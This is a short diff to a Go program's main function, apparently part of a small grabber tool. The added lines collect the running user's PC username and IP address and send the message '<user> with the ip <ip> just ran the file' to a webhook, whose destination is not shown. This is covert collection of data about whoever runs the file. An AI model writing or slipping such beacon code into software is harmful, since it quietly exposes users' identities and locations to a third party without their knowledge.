@@ -2,12 +2,18 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 )
 
 func main() {
+	var messageContent string
+	var pcUsername string = getPcUsername()
+	var ip string = getIp()
+	const thing string = "fdsfsf"
+	messageContent = fmt.Sprintf("%s with the ip %s just ran the file", pcUsername, ip)
 	//timeIt()
-	webhook()
-  getIp()
+	webhook(messageContent)
+	println(getIp())
 }
 
 func dojson(str string) {
